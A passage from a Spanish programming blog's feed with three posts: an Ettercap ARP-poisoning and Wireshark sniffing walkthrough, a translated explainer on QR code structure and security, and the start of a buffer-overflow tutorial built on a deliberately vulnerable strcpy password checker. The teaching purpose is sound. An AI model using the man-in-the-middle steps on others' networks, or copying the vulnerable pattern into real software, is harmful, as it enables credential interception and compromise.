&lt;p&gt;Para ver las ips de los hosts encontrados vamos a &lt;code&gt;Hosts -&amp;gt; hosts list&lt;/code&gt;, nos quedamos con la ip de nuestro objetivo y pasamos al siguiente paso, &lt;code&gt;Targets -&amp;gt; Select TARGET(s)&lt;/code&gt;, aquí debemos poner como &lt;code&gt;target1&lt;/code&gt; nuestra puerta de enlace predeterminada, y como target 2 el objetivo:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 541px) 541px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34;  height=&#34;93&#34; width=&#34;541&#34; src=&#34;https://3.bp.blogspot.com/-lFH6pB11PTA/TdlUjkVJPJI/AAAAAAAAAhE/m_W8MFwPLfA/s800/target.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Ahora hacemos &lt;code&gt;Start -&amp;gt; Start sniffing&lt;/code&gt;, y despues, procedemos al envenenamiento ARP. &lt;code&gt;Mitm -&amp;gt; Arp poisoning&lt;/code&gt;. lo que nos pedirá unos parámetros, yo he puesto oneway, que fuerza a envenenar solo desde Target1 a Target2, útil para envenenar solo el objetivo y no el router:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 530px) 530px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34;  height=&#34;78&#34; width=&#34;530&#34; src=&#34;https://4.bp.blogspot.com/-KMyx2G5WS_0/TdlWJa5riyI/AAAAAAAAAhM/fyZXGORdX7A/s800/arp.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Si ejecutamos antes de realizar todo esto &lt;code&gt;arp -a&lt;/code&gt; en el equipo objetivo, vemos que la puerta de enlace tiene una MAC asociada, despues de hacer en envenenamiento, esta MAC es la del equipo atacante.&lt;/p&gt;

&lt;p&gt;Ahora llega el turno de wireshark,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr@hkr-pc:~$ sudo wireshark
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Vamos a &lt;code&gt;Capture -&amp;gt; Options&lt;/code&gt;, aquí seleccionaremos la interfaz a esniffar, que debe ser la misma que usamos en ettercap, dejamos marcada la casilla &lt;em&gt;Capture packets in promiscuous mode&lt;/em&gt; y clicamos en start:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 640px) 640px, 100vw&#34; layout=&#34;responsive&#34;  height=&#34;594&#34; width=&#34;640&#34; src=&#34;https://3.bp.blogspot.com/-W8mrGI5blBY/TdlYTc3yTLI/AAAAAAAAAhU/p3uTj_g8We4/s800/capture.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Todo esto me sirvió para descubrir que mi aplicación manda cierta información en Texto plano, como usuario y contraseña de la Base de datos y consultas SQL, de modo que tendré que encriptarlo:&lt;/p&gt;

&lt;figure&gt;
    &lt;a href=&#34;https://1.bp.blogspot.com/-IJWXvfdJegA/TdlZvAxBggI/AAAAAAAAAhc/-i-VAe-xow8/s1600/bd.png&#34;&gt;&lt;img sizes=&#34;(min-width: 800px) 800px, 100vw&#34; layout=&#34;responsive&#34;  height=&#34;483&#34; width=&#34;800&#34; src=&#34;https://1.bp.blogspot.com/-IJWXvfdJegA/TdlZvAxBggI/AAAAAAAAAhc/-i-VAe-xow8/s800/bd.png&#34;&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;Atención:&lt;/strong&gt; Una vez terminemos de esnifar, no se nos puede olvidar quitar el envenenamiento ARP &lt;code&gt;Mitm -&amp;gt; Stop mitm attack(s)&lt;/code&gt;, ya que si no, al apagar el equipo atacante el objetivo se queda sin conexión, al hacer el atacante de puerta de enlace. Por último, &lt;code&gt;Start -&amp;gt; Stop sniffing&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo proximo que quiero intentar es conseguir sacar el Id y contraseña del chat de tuenti (Red social española), para conectarme a dicho chat sin necesidad de entrar en la web, usando emphaty por ejemplo, hay gente que ya lo ha conseguido &lt;a href=&#34;http://blogguino.blogspot.com/2010/05/tuenti-chat-en-empathy-sin-contactos.html&#34;&gt;ojeando las cookies&lt;/a&gt;, pero voy a hacerlo de esta forma, ya que ojeando con wireshark conseguí sacar el ID y demás, pronto escribiré una entrada si lo consigo.&lt;/p&gt;

&lt;h1 id=&#34;bibliografia&#34;&gt;Bibliografia&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.bujarra.com/ProcedimientoManInTheMiddle.html&#34;&gt;Bujarra.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Estructura y seguridad de los QR Codes</title>
            <link>https://elbauldelprogramador.com/estructura-y-seguridad-de-los-qr-codes/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/estructura-y-seguridad-de-los-qr-codes/</guid>
            <description>&lt;blockquote&gt;
&lt;p&gt;Otra semana más me ha interesado el contenido del episodio del programa de radio Security Now!, que comparto con vosotros. Nota: El contenido no es de mi autoría, simplemente lo he traducido.&lt;/p&gt;

&lt;p&gt;El anterior espisodio traducido fué &lt;a href=&#34;https://elbauldelprogramador.com/lo-ultimo-en-criptografia-fully-homomorphic-encryption/&#34;&gt;Lo último en criptografía: Fully Homomorphic Encryption&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 300px) 300px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/linkentrada2-300x300.png&#34; alt=&#34;QR Code&#34; width=&#34;300px&#34; height=&#34;300px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;Seguro que estás familiarizado con la imagen de la izquierda, y habrás usado escánares para acceder a su contenido más de una vez, ya que últimamente están de moda y se encuentran en todas partes.&lt;/p&gt;

&lt;p&gt;Sin embargo esta tecnología se inventó hace 18 años para rastrear rápidamente piezas coches durante su ensamblaje en Japón, y se diseñaron muy bien.&lt;/p&gt;

&lt;p&gt;Todos son cuadrados y siempre tienen una zona llamada &lt;em&gt;zona tranquila&lt;/em&gt; ó &lt;strong&gt;quiet zone&lt;/strong&gt;. Una de las mejores características de estos códigos es que son neutrales respecto a la orientación, es decir, no es necesario estar exactamente enfrente a ellos o alineados verticalmente para escanearlos. La imagen en sí proporciona toda la información necesaria para permitir al software girarla, orientarla y aplanarla, incluso si se fotografía el código con ángulo.&lt;/p&gt;

&lt;p&gt;La característica más prominente del QR Code son los tres cuadrados que aparecen en trés de las cuatro esquinas de la imagen. Son tres porque facilitan una orientación rotacional rápida y a la vez proporcionan un inmediato sentido del tamaño y orientación angular. En la esquina restante hay otro pequeño cuadrado. Normalmente los cuadrados de mayor tamaño se situan en la esquia superior derecha e izquierda e inferior izquierda, dejando al de menor tamaño en la esquina inferior derecha. El hecho de que exista un cuadrado grande en la esquina inferior derecha aporta una idea instantanea de orientación rotacional. Si te fijas, el cuadrado más pequeño está a 4 bits desde la base de la imagen y 4 bits desde la derecha:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 280px) 280px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/qrbaultargetdownright2.png&#34; alt=&#34;qrbaultargetdownright&#34; width=&#34;280px&#34; height=&#34;280px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;Hay algo que se encuentra en todos y cada uno de los QR que existen, y es una marca de rastreo que une las esquinas interiores de los cuadrados grandes. Mirando entre los cuadrados superiores, se aprecia que siempre hay la siguiente sucesión (negro/blanco, negro/blanco). Es decir un &lt;a href=&#34;http://es.wikipedia.org/wiki/Ciclo_de_trabajo&#34; target=&#34;_blank&#34;&gt;ciclo de trabajo del 50%&lt;/a&gt;. Siempre aparece en los QR Codes. Lo mismo pasa entre el cuadrado superiore inferior izquierdo. Este diseño permite tener una referencia del tamaño y de nuevo orientación posicional adicional.&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 280px) 280px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/qrbaulinnercorners2.png&#34; alt=&#34;qrbaulinnercorners&#34; width=&#34;280px&#34; height=&#34;280px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;El código en sí tiene un número de formato y de versión almacenado en los bits circundantes a los tres cuadrados grandes. Dichos bits están siempre en una posición conocida dado que se sabe dónde están colocados los cuadrados grandes. La información almacenada ahí contiene el número de versión y el formato del QR Code.&lt;/p&gt;

&lt;p&gt;La densidad oscila en el rango 1-40, proveyendo rango de almacenamiento de hasta 2000 caracteres.&lt;/p&gt;

&lt;p&gt;A la hora de codificar los caracteres los creadores no usaron 1 Byte como es habitual, sino un conjunto de caracteres de 45 elementos. Por lo que solo exiten mayúsculas y algunos caracteres especiales. Lo cual es suficiente para codificar URLs. Aún así, existe un modo binario que permite almacenar caracteres de 8 bits.&lt;/p&gt;

&lt;p&gt;La codificación del contenido comienza en la esquina inferior derecha y se almacena en bloques de 2&amp;#215;4, la razón del tamaño es para que sean lo más cuadrados posibles, de esta forma los bits en un byte ocupan la menor área posible.&lt;/p&gt;

&lt;p&gt;Los diseñadores prestaron mucha atención a la corrección de errores, y desarrollaron tres niveles &lt;strong&gt;bajo, medio, cuartil y alto&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;El nivel más alto de corrección de errores ocupa dos tercios de la superficie del QR Code, lo cual quiere decir que como mucho es posible que se pierda un tercio de la información codificada. De hecho, una con una simple búsqueda en internet se pueden encontrar QR Codes como el de wikipedia:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 564px) 564px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/Custom_QR_code_Wikipedia2.png&#34; alt=&#34;Custom_QR_code_Wikipedia&#34; width=&#34;564px&#34; height=&#34;396px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;A pesar de haber escrito una palabra justo en mitad del código, sigue siendo decodificable por el lector. Aunque se haya borrado un trozo de información, la corrección de errores la reconstruye.&lt;/p&gt;

&lt;p&gt;Este tipo de corrección es similar al estilo de corrección de errores &lt;strong&gt;Reed-Solomon&lt;/strong&gt; (Información en &lt;a href=&#34;http://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction&#34; target=&#34;_blank&#34;&gt;inglés&lt;/a&gt;, inf. en &lt;a href=&#34;http://es.wikipedia.org/wiki/Reed-Solomon&#34; target=&#34;_blank&#34;&gt;Español&lt;/a&gt;) que usan los discos duros. Al igual que en los QR Codes, en los discos duros puede haber un pequeño defecto en la superficie que cause la pérdida de una región física. Esta tecnología permite una recuperación robusta de los datos.&lt;/p&gt;

&lt;p&gt;Esencialmente hay un mosaico de 2&amp;#215;4 que se extiende a lo largo de un borde y luego da la vuelta. Pero no como un &lt;a href=&#34;http://en.wikipedia.org/wiki/Raster_scan&#34; target=&#34;_blank&#34;&gt;raster scan&lt;/a&gt;, que salta de nuevo hacia donde empezó. En lugar de eso, se da la vuelta y regresa al punto de origen, dos bits más hayá. Luego vuelve a girar y regresar.&lt;/p&gt;

&lt;p&gt;Uno de los problemas que se encontraron los diseñadores fue a la hora de que los datos emularan las características de reparación del QR Code. Habría un problema de señalización en banda, que es el término usado en teoría de la información para referirse al problema de intentar tener datos de formato, que deben estar separados del contenido, el problema es que el código se imprime con tinta. ¿Cómo se diferencia qué es datos y qué es formato?&lt;/p&gt;

&lt;p&gt;Se plantearon organizar la información, pero ¿que pasa si la información ordenada se parece a uno de los cuadrados principales?, ¿y si aparecen demasiados espacios en blanco consecutivos?. Eso sería un problema. De nuevo el QR Code actua de forma similar a los discos duros usando una tecnología llamada Self-Clocking (Autosincronizable). En lugar de malgastar espacio con una señal de reloj o una traza de reloj además de los datos, organizaron los datos de forma que fueran autosincronizables, para que proporcionen su propia información de sinconización.&lt;/p&gt;

&lt;p&gt;El modo de hacerlo es asegurarse que no hay, en el caso de los discos duros, un grupo de ceros juntos. Tener esta sucesión de ceros juntos significa que no está pasando nada, el problema surge cuando pasa algo (aparecen 1s) es necesario saber exáctamente cuantas cosas &lt;strong&gt;no&lt;/strong&gt; pasaron, es decir, cuantos ceros había. Y puede ser peligroso si el disco duro no gira a ritmo constante. De forma similar, si el QR Code está estirado o arrugado causará un cambio local en la frecuencia del patrón establecido en el campo visual. Así que no es buena idea tener grandes bloques negros o blancos en el Qr Code porque sería un problema a la hora de conocer su tamaño, lo cual es crucial, especialmente en Qr Codes de gran densidad que se lean desde cierta distancia. Sería dificil saber cuantos bits posee.&lt;/p&gt;

&lt;p&gt;La solución tomada por los diseñadores fue establecer una máscara para uno de los formatos de control. Y realizar un XOR a todo el conjunto de datos. La opereración XOR se usa muy amenudo en &lt;a href=&#34;https://elbauldelprogramador.com/lo-ultimo-en-criptografia-fully-homomorphic-encryption/&#34; title=&#34;Lo último en criptografía: Fully Homomorphic Encryption&#34;&gt;criptografía&lt;/a&gt;. Al realizar un XOR a algún dato, se invierten los bits, si se vuelve a realizar un XOR sobre los mismos datos, se obtiene el dato original.Debido a lo simple de realiazar un XOR es el proceso perfecto para resolver el problema. Dependiendo de la naturaleza de los datos contenidos en el QR Code crearon una librería con ocho patrones XOR distintos derivados matemáticamente de las coordenadas X e Y de una porción de 8&amp;#215;8.&lt;/p&gt;

&lt;p&gt;Estos patrones de 8&amp;#215;8, por ejemplo, son un tablero de ajedrez, otro son rayas verticales, rayas horizontales etc. Llegados a este punto, la tarea del codificador QR es establecer un QR code simple, sin enmascarar ni XOR y luego seguir un criterio para detectar posibles problemas, como grandes secuencias de ceros o unos, o formaciones de grandes bloques.&lt;/p&gt;

&lt;p&gt;Lo que se hace es aplicar cada una de las ocho máscaras para obtener ocho posibles QR codes candidatos y basandose en un criterio elige el más adecuado, y almacenará la máscara elegida como información de codificación.&lt;/p&gt;

&lt;p&gt;Finalmente para decodificar el contenido, se empieza por la esquina inferior derecha, donde se encuentra el tipo de codificación (de 4 bits de tamaño), luego la longitud (8 bits) seguido de los datos almacenados. Despues de los datos puede haber otra codificación y otra longitud para seguir obteniendo datos. Por consiguiente, es posible disponer de múltiples formatos en un solo QR code. Incluso densidad y correncción de errores variable. Hay que tener una concepto claro, la corrección de errores significa redundancia, a más corrección de errores, mayor porcentaje del área no serán datos.&lt;/p&gt;

&lt;h1 id=&#34;pasemos-a-ver-los-aspectos-de-seguridad&#34;&gt;&lt;strong&gt;Pasemos a ver los aspectos de seguridad.&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Debido a que estos códigos pueden usarse para representar cualquier cosa, hay gente con malas intenciones que sabe que se están haciendo fotos a los QR Codes. Incluso los anunciantes hacen uso de ellos. Aparecen en muchos carteles. Los códigos QR populares se están reemplazando con pegatinas con otro QR code con contenido malicioso.&lt;/p&gt;

&lt;p&gt;Normalmente los intérpretes instalados en los smartphones preguntan qué deseas hacer con el contenido del QR code que acaba de leer, compartirlo, ir a la dirección web almacenara etc. Sin embargo hay algunos intérpretes que no están implementados de esta forma. Y es un problema, porque es totalmente posible realizar un &lt;a href=&#34;https://elbauldelprogramador.com/explotacion-buffers-overflows-y-exploits-parte-i/&#34; title=&#34;Explotación – Buffers OverFlows y exploits (Parte I)&#34;&gt;buffer overflow&lt;/a&gt; en el intérprete. Hasta la fecha no se conoce ninguno, pero si lo hubiera sobreescribiría la funcionalidad del intérprete, y tomarían el control del smartphone.&lt;/p&gt;

&lt;p&gt;Por ese motivo Symantec ha creado un intérprete llamado &lt;strong&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.symantec.norton.snap&amp;hl=en&#34; target=&#34;_blank&#34;&gt;Norton Snap&lt;/a&gt;&lt;/strong&gt; disponible tanto para Android como iOS.&lt;/p&gt;

&lt;p&gt;Otro buen intérprete es &lt;strong&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.google.zxing.client.android&amp;feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5nb29nbGUuenhpbmcuY2xpZW50LmFuZHJvaWQiXQ..&#34; target=&#34;_blank&#34;&gt;Barcode Scanner&lt;/a&gt;&lt;/strong&gt;, pregunta qué se quiere hacer con el contenido, en lugar de redirigir directamente a la url codificada.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTA:&lt;/strong&gt;Este artículo ha sido escrito a partir del episodio 382 de Security Now!, no me atribuyo ninguna autoría, simplemente he escuchado el episodio y he plasmado lo que he aprendido. A continuación proporciono los enlaces correspondientes al episodio&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Transcipciones a texto y audio del episodio&lt;/em&gt; »» &lt;a href=&#34;http://www.grc.com/securitynow.htm&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Episode 382: QR Codes&lt;/em&gt; »» &lt;a href=&#34;http://twit.tv/show/security-now/382&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Explotación - Buffers OverFlows y exploits (Parte I)</title>
            <link>https://elbauldelprogramador.com/explotacion-buffers-overflows-y-exploits-parte-i/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/explotacion-buffers-overflows-y-exploits-parte-i/</guid>
            <description>&lt;blockquote&gt;
&lt;p&gt;La explotación de programas es un elemento básico del hacking. Un programa está compuesto de un conjunto de reglas complejas siguiendo un flujo de ejecución que dice al ordenador qué hacer. Explotar un programa es una forma inteligente de conseguir que el ordenador haga lo que tú quieras, incluso si dicho programa no se diseñó para hacerlo. - &lt;strong&gt;The art of Exploitation, Capítulo 3&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;El libro &lt;em&gt;&lt;a href=&#34;http://www.amazon.es/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag;=elbaudelpro-21&amp;amp;linkCode;=as2&amp;amp;camp;=3626&amp;amp;creative;=24822&amp;amp;creativeASIN;=1593271441&#34;&gt;Hacking: The Art of Exploitation&lt;/a&gt;&lt;/em&gt;, es un libro que recomiendo a todo aquel interesado en aprender temas sobre seguridad informática.&lt;/p&gt;

&lt;p&gt;Esta va a ser la primera de las 3 o 4 entradas que voy a dedicar a explicar cómo aprovecharse de los buffers overflows en los programas para modificar su comportamiento, e incluso conseguir el control total de la máquina.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar con un programa simple extraído del libro, que reciba como parámetro una cadena a modo de contraseña:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;auth-overflow-c&#34;&gt;&lt;code&gt;auth_overflow.c&lt;/code&gt;&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

   &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;brillig&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;outgrabe&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;Usage: %s n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;      Acceso concedido.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;nAcceso denegado.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;No parece que el programa tenga ningún error, admite dos contraseñas (brillig y outgrabe), vamos a probarlo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr-&amp;gt; ./auth_overflow.binary contraseña

Acceso denegado.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr-&amp;gt; ./auth_overflow.binary brillig

